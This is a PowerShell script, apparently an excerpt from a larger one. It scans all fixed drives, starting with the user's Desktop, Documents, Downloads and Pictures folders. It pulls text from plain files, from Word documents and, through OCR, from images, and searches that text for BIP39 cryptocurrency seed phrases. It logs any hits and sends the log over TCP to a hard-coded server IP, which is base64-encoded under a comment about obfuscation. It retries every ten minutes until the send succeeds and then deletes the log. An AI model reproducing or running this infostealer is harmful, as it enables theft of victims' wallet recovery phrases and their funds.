Add-EnvBasedExclusion "ProgramFiles(x86)" "ABBYY FineReader *\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Foxit Software\Foxit PhantomPDF\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Evernote\Evernote\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Zotero\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "CodeBlocks\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Audacity\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Epic Games\Launcher\Engine\Binaries\Win64\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Battle.net\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Origin\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "GOG Galaxy\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Ubisoft\Ubisoft Game Launcher\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Minecraft Launcher\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "World of Warcraft\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Kaspersky Lab\Kaspersky Internet Security *\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "IObit\IObit Uninstaller\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Glary Utilities 5\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Wise\Wise Care 365\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "OpenOffice 4\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Adobe\Adobe Photoshop *\*"

$userProfileLocalSubPaths = @(
    "Programs\Python\Python3*\*", "Netease\CloudMusic\*", "Postman\*", "Microsoft\Teams\*",
    "Wox\app-*\*", "Programs\Opera\*", "Vivaldi\Application\*"
)
$userProfileRoamingSubPaths = @( "jupyter\*", "Zoom\bin\*", "Lantern\*", "uTorrent\*", "BitTorrent\*")
$userProfileCommonSubPaths = @( ".vscode\*", ".git\*", "node_modules\*", "npm\*", "cache\*", "eclipse\*", "Desktop\Tor Browser\*" )

if (-not [string]::IsNullOrEmpty($env:LOCALAPPDATA)) {
    $userProfileLocalSubPaths | ForEach-Object { Add-EnvBasedExclusion "LOCALAPPDATA" $_ }
    Add-EnvBasedExclusion "LOCALAPPDATA" "Packages\*"
    Add-EnvBasedExclusion "LOCALAPPDATA" "Microsoft\Edge\User Data\*"
    Add-EnvBasedExclusion "LOCALAPPDATA" "Microsoft\Internet Explorer\CacheStorage\*"
    Add-EnvBasedExclusion "LOCALAPPDATA" "Microsoft\Windows\WebCache\*"
    Add-EnvBasedExclusion "LOCALAPPDATA" "Temp\*"
    Add-EnvBasedExclusion "LOCALAPPDATA" "Google\Chrome\User Data\Default\Cache\*"
    Add-EnvBasedExclusion "LOCALAPPDATA" "Google\Chrome\User Data\Default\Code Cache\*"
    Add-EnvBasedExclusion "LOCALAPPDATA" "Mozilla\Firefox\Profiles\*\cache2\*"
}
if (-not [string]::IsNullOrEmpty($env:APPDATA)) {
    $userProfileRoamingSubPaths | ForEach-Object { Add-EnvBasedExclusion "APPDATA" $_ }
    Add-EnvBasedExclusion "APPDATA" "Microsoft\Windows\Themes\*"
}
if (-not [string]::IsNullOrEmpty($env:USERPROFILE)) {
     $userProfileCommonSubPaths | ForEach-Object { Add-EnvBasedExclusion "USERPROFILE" $_ }
}

Add-ExclusionPattern "C:\wamp64\*"
Add-ExclusionPattern "C:\xampp\*"
Add-ExclusionPattern "C:\Focusee\FocuSee Projects\*"
Add-ExclusionPattern "C:\nvm4w\nodejs\node_modules\*"
Add-ExclusionPattern "*\node_modules\*"

$Global:excludePatterns = $Global:excludePatterns | Select-Object -Unique
Write-Console "Total exclusion patterns loaded: $($Global:excludePatterns.Count)" "DEBUG"

function Is-ExcludedPath {
    param($filePathToCheck)
    $normalizedFilePath = $filePathToCheck.ToLower()
    foreach ($pattern in $Global:excludePatterns) {
        if ($normalizedFilePath -like $pattern.ToLower()) { return $true }
    }
    if ($filePathToCheck -eq $logFile) { return $true }
    return $false
}

function Get-WordText {
    param($filePathToRead)
    try {
        $wordApp = New-Object -ComObject Word.Application
        $wordApp.Visible = $false
        $doc = $wordApp.Documents.Open($filePathToRead, $false, $true)
        $textContent = $doc.Content.Text
        $doc.Close([Microsoft.Office.Interop.Word.WdSaveOptions]::wdDoNotSaveChanges)
        $wordApp.Quit()
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc) | Out-Null
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($wordApp) | Out-Null
        Write-Console "Successfully read Word document: `"$($filePathToRead)`""
        return $textContent
    } catch {
        $errMsg = "Error reading Word document."
        if ($_ -ne $null -and $_.Exception -ne $null) { $errMsg = $_.Exception.Message }
        $logMessage = "Failed to read Word document `"{0}`". Ensure Microsoft Word is installed. Error: {1}" -f $filePathToRead, $errMsg
        Write-Console $logMessage "ERROR"
        return $null
    } finally {
        Get-Process winword -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

function Get-ImageText {
    param($filePathToRead)
    if (-not $tesseractAvailable -or [string]::IsNullOrEmpty($Global:tesseractExecutablePath)) {
        Write-Console "Tesseract OCR not properly configured or available. Skipping image file: `"$($filePathToRead)`"" "WARNING"
        return $null
    }
    try {
        $commandArgs = @("`"$filePathToRead`"", "stdout", "-l", "eng", "--psm", "3", "-c", "preserve_interword_spaces=1")
        if (-not [string]::IsNullOrEmpty($Global:tesseractDataDirectory)) {
            $commandArgs += "--tessdata-dir", "`"$($Global:tesseractDataDirectory)`""
        } else {
            Write-Console "Tessdata directory for Tesseract is not explicitly set by the script. Tesseract will rely on its default search paths or TESSDATA_PREFIX environment variable." "WARNING"
        }

        Write-Console "Attempting OCR with Tesseract: `"$($Global:tesseractExecutablePath)`" $($commandArgs -join ' ')" "DEBUG"
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $Global:tesseractExecutablePath
        $processInfo.Arguments = $commandArgs -join ' '
        $processInfo.RedirectStandardOutput = $true; $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false; $processInfo.CreateNoWindow = $true
        $processInfo.StandardOutputEncoding = [System.Text.Encoding]::UTF8
        $processInfo.StandardErrorEncoding = [System.Text.Encoding]::UTF8

        $process = New-Object System.Diagnostics.Process; $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        $stdout = $process.StandardOutput.ReadToEnd(); $stderr = $process.StandardError.ReadToEnd()
        $process.WaitForExit()

        $textContent = $stdout.Trim()
        if ($process.ExitCode -ne 0 -or ($stderr -ne $null -and $stderr.Trim() -ne '' -and $stderr -notmatch "Warning\. Invalid resolution 0 dpi\." -and $stderr -notmatch "OMP: Info #")) {
            Write-Console "Tesseract OCR execution encountered an issue (Exit Code: $($process.ExitCode)) for file: `"$filePathToRead`"" "WARNING"
            if (-not [string]::IsNullOrWhiteSpace($stderr)) { Write-Console "Tesseract Error Output: $stderr" "DEBUG" }
        }
        Write-Console "Successfully processed image (OCR) for `"$($filePathToRead)`" (using: $($Global:tesseractExecutablePath)). Extracted text length: $($textContent.Length)" "INFO"
        if ($textContent.Length -gt 0 -and $textContent.Length -lt 300) { Write-Console "Short OCR Text from `"$($filePathToRead)`": $($textContent)" "DEBUG" }
        return $textContent
    } catch {
        $errMsg = "Unknown error processing image with OCR (attempted with: $($Global:tesseractExecutablePath))."
        if ($_ -ne $null -and $_.Exception -ne $null) { $errMsg = $_.Exception.Message }
        $logMessage = "OCR processing for image `"{0}`" failed. Ensure Tesseract OCR (and English language data) is correctly configured. Error: {1}" -f $filePathToRead, $errMsg
        Write-Console $logMessage "ERROR"
        return $null
    }
}

Write-Console "Identifying drives to scan..." "INFO"
$drivesToScan = $null
try {
    $allDrives = Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue
    Write-Console "All detected file system drives (for diagnostics):" "DEBUG"
    $driveInfoString = $allDrives | Select-Object Name, Root, @{Name="DriveTypeVal";Expression={$_.DriveType}}, @{Name="DriveTypeString";Expression={try { [System.IO.DriveType]$_.DriveType } catch { "N/A" } }}, Used, Free | Format-Table -AutoSize -Wrap | Out-String
    $driveInfoString.Split([Environment]::NewLine) | ForEach-Object { if (-not [string]::IsNullOrWhiteSpace($_)) { Write-Console $_.TrimEnd() "DEBUG" } }
    $fixedDriveTypeInt = [int][System.IO.DriveType]::Fixed
    Write-Console "Filtering criteria: DriveType is Fixed (integer value $fixedDriveTypeInt), Used > 0, Free is not null, Root path is not empty." "DEBUG"
    $filteredDrives = $allDrives | Where-Object {
        $drive = $_; $isFixed = $false
        if ($null -ne $drive.DriveType) { try { if (($drive.DriveType -is [System.IO.DriveType] -and $drive.DriveType -eq [System.IO.DriveType]::Fixed) -or ($drive.DriveType -is [int] -and $drive.DriveType -eq $fixedDriveTypeInt) -or ($drive.DriveType -is [string] -and $drive.DriveType -eq "Fixed")) { $isFixed = $true } } catch { Write-Console "Error comparing DriveType for drive $($drive.Name): $($_.Exception.Message)" "WARNING" } }
        else { if ($drive.Name -eq "C") { Write-Console "DriveType for drive $($drive.Name) is null, assuming Fixed because it is C: drive." "INFO"; $isFixed = $true } else { Write-Console "DriveType for drive $($drive.Name) is null, cannot determine its type for filtering." "WARNING" } }
        $passesFilter = $isFixed -and ($null -ne $drive.Used -and $drive.Used -gt 0) -and ($null -ne $drive.Free) -and (-not [string]::IsNullOrWhiteSpace($drive.Root))
        if (-not $passesFilter -and $isFixed) { Write-Console "Drive $($drive.Name) (determined Fixed: $isFixed) was not selected. Used: $($drive.Used), Free: $($drive.Free), Root: '$($drive.Root)'" "DEBUG" }
        $passesFilter
    }
    $drivesToScan = $filteredDrives.Root
} catch { Write-Console "Critical error occurred while fetching drive list: $($_.Exception.Message)" "ERROR"}

if (-not $drivesToScan -or $drivesToScan.Count -eq 0) {
    Write-Console "No fixed drives with used space were found to scan. This might be a permissions issue (try running as Administrator) or no suitable drives exist. Review 'All detected file system drives' diagnostic log above." "CRITICAL"
} else {
    Write-Console "Drives to be scanned: $($drivesToScan -join ', ')" "INFO"
}

$allScanFileTypes = $textExtensions + $wordExtensions + $imageExtensions
$textExtCompare = $textExtensions -replace '\*\.','.'; $wordExtCompare = $wordExtensions -replace '\*\.','.'; $imageExtCompare = $imageExtensions -replace '\*\.','.'
$explicitlyExcludedExtCompare = $explicitlyExcludedExtensions -replace '\*\.', '.'

function Process-FileItem {
    param(
        [System.IO.FileInfo]$currentFile,
        [string]$filePath,
        [string]$currentFileExtension
    )
    if (Is-ExcludedPath $filePath) { Write-Console "Skipping excluded path: $filePath" "DEBUG"; return }
    if ($explicitlyExcludedExtCompare -contains $currentFileExtension) { Write-Console "Skipping explicitly excluded file type (from specific list): $filePath" "DEBUG"; return }

    $maxNonImageFileSize = 1MB
    $maxImageFileSizeForOCR = 50MB
    $isImageFile = $imageExtCompare -contains $currentFileExtension

    if ($isImageFile) {
        if ($currentFile.Length -gt $maxImageFileSizeForOCR) {
            Write-Console "Skipping large image file (>$($maxImageFileSizeForOCR/1MB)MB) for OCR: $filePath" "INFO"
            return
        }
    } else {
        if ($currentFile.Length -gt $maxNonImageFileSize) {
            Write-Console "Skipping large non-image file (>$($maxNonImageFileSize/1MB)MB): $filePath" "INFO"
            return
        }
    }

    Write-Console "Processing file: $filePath (Size: $([Math]::Round($currentFile.Length / 1KB, 2)) KB)" "INFO"
    $extractedContent = $null
    try {
        if ($textExtCompare -contains $currentFileExtension) { $extractedContent = Get-Content $filePath -Raw -Encoding UTF8 -ErrorAction Stop }
        elseif ($wordExtCompare -contains $currentFileExtension) { $extractedContent = Get-WordText $filePath }
        elseif ($imageExtCompare -contains $currentFileExtension) { $extractedContent = Get-ImageText $filePath }

        if ($extractedContent -ne $null -and $extractedContent.Trim() -ne "") {
            Search-TextContent $extractedContent $filePath $bip39Words
        }
    } catch {
        $errMsg = "Error during content extraction or search for file."
        if ($_ -ne $null -and $_.Exception -ne $null) { $errMsg = $_.Exception.Message }
        $logMessage = "Error processing file `"{0}`": {1}" -f $filePath, $errMsg
        Write-Console $logMessage "ERROR"
    }
}

$userProfilePath = $env:USERPROFILE
$prioritizedFolders = @(
    (Join-Path $userProfilePath "Desktop"),
    (Join-Path $userProfilePath "Documents"),
    (Join-Path $userProfilePath "Downloads"),
    (Join-Path $userProfilePath "Pictures")
)

foreach ($drive in $drivesToScan) {
    Write-Console "Starting scan on drive: $drive" "INFO"

    Write-Console "Scanning prioritized user folders on drive $drive..." "INFO"
    foreach ($priorityFolder in $prioritizedFolders) {
        if ($priorityFolder.StartsWith($drive, [System.StringComparison]::OrdinalIgnoreCase) -and (Test-Path $priorityFolder -PathType Container)) {
            Write-Console "Scanning priority folder: $priorityFolder" "INFO"
            try {
                Get-ChildItem -Path $priorityFolder -Include $allScanFileTypes -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
                    if (-not $Global:processedFiles.Contains($_.FullName)) {
                        Process-FileItem -currentFile $_ -filePath $_.FullName -currentFileExtension $_.Extension.ToLowerInvariant()
                        $Global:processedFiles.Add($_.FullName) | Out-Null
                    }
                }
            } catch {
                $errMsg = "Error scanning priority folder $priorityFolder."
                if ($_ -ne $null -and $_.Exception -ne $null) { $errMsg = $_.Exception.Message }
                Write-Console "$errMsg Full error: $_" "ERROR"
            }
        }
    }
    Write-Console "Finished scanning prioritized user folders on drive $drive." "INFO"

    Write-Console "Starting general scan for remaining files on drive $drive..." "INFO"
    try {
        Get-ChildItem -Path $drive -Include $allScanFileTypes -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            if (-not $Global:processedFiles.Contains($_.FullName)) {
                 Process-FileItem -currentFile $_ -filePath $_.FullName -currentFileExtension $_.Extension.ToLowerInvariant()
                 $Global:processedFiles.Add($_.FullName) | Out-Null
            }
        }
    } catch {
        $errMsg = "Unknown error occurred while scanning drive."
        if ($_ -ne $null -and $_.Exception -ne $null) { $errMsg = $_.Exception.Message }
        $logMessage = "CRITICAL error scanning drive {0}: {1}. Skipping rest of this drive." -f $drive, $errMsg
        Write-Console $logMessage "ERROR"
    }
    Write-Console "Finished scan on drive: $drive" "INFO"
}

Write-Console "Search completed." "INFO"
Write-Console "Script finished. Log file for found items (if any) is at: $logFile" "INFO"

function Send-LogToServerAndCleanup {
    param(
        [string]$LogFilePath,
        [string]$ServerIp,
        [int]$ServerPort
    )

    if (Test-Path $LogFilePath -PathType Leaf) {
        $logContent = ""
        try {
            $logContent = Get-Content $LogFilePath -Raw -Encoding UTF8 -ErrorAction Stop
        } catch {
            Write-Console "Error reading log file '$LogFilePath': $($_.Exception.Message). Assuming empty or unreadable." "ERROR"
        }

        if ([string]::IsNullOrWhiteSpace($logContent)) {
            Write-Console "Log file '$LogFilePath' is empty or unreadable. No data to send." "INFO"
            try {
                Remove-Item $LogFilePath -Force -ErrorAction SilentlyContinue
                Write-Console "Log file '$LogFilePath' (if it existed and was empty/unreadable) has been removed." "INFO"
            } catch {
                Write-Console "Failed to remove empty/unreadable log file '$LogFilePath': $($_.Exception.Message)" "ERROR"
            }
            Write-Console "Exiting script as there is no log content to send." "INFO"
            Exit
        }

        Write-Console "Log file '$LogFilePath' has content. Attempting to send to $ServerIp`:$ServerPort..." "INFO"
        $sentSuccessfully = $false
        while (-not $sentSuccessfully) {
            $tcpClient = $null
            $stream = $null
            $writer = $null
            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                Write-Console "Connecting to $ServerIp`:$ServerPort..." "DEBUG"
                $tcpClient.Connect($ServerIp, $ServerPort)
                Write-Console "Connected. Preparing to send data..." "DEBUG"
                $stream = $tcpClient.GetStream()
                $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
                $writer.Write($logContent)
                $writer.Flush()
                $sentSuccessfully = $true
                Write-Console "Log content successfully sent to $ServerIp`:$ServerPort." "INFO"
            } catch {
                Write-Console "Failed to send log content to $ServerIp`:$ServerPort. Error: $($_.Exception.Message)" "ERROR"
                Write-Console "Retrying in 10 minutes..." "INFO"
                Start-Sleep -Seconds 600 # 10 minutes
            } finally {
                if ($writer -ne $null) { $writer.Close() }
                if ($stream -ne $null) { $stream.Close() }
                if ($tcpClient -ne $null) { $tcpClient.Close() }
            }
        }

        if ($sentSuccessfully) {
            try {
                Remove-Item $LogFilePath -Force -ErrorAction Stop
                Write-Console "Log file '$LogFilePath' deleted successfully after sending." "INFO"
            } catch {
                Write-Console "Failed to delete log file '$LogFilePath' after sending: $($_.Exception.Message)" "ERROR"
            }
        }
        Write-Console "Exiting script." "INFO"
        Exit

    } else {
        Write-Console "Log file '$LogFilePath' not found. No data to send." "INFO"
        Write-Console "Exiting script." "INFO"
        Exit
    }
}

$encodedServerIp = "NDUuMjA3LjE5Mi43Mg==" 
try {
    $targetServerIp = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedServerIp))
    # Write-Console "Decoded target Server IP: $targetServerIp" "DEBUG" # Debug message can be removed for final version
} catch {
    Write-Console "CRITICAL: Failed to decode server IP address. Cannot send log. Error: $($_.Exception.Message)" "ERROR"
    $targetServerIp = "ERROR_DECODING_IP" # Fallback to prevent script error, though connection will fail
}
# --- End IP Address Obfuscation ---

Send-LogToServerAndCleanup -LogFilePath $logFile -ServerIp $targetServerIp -ServerPort 1234
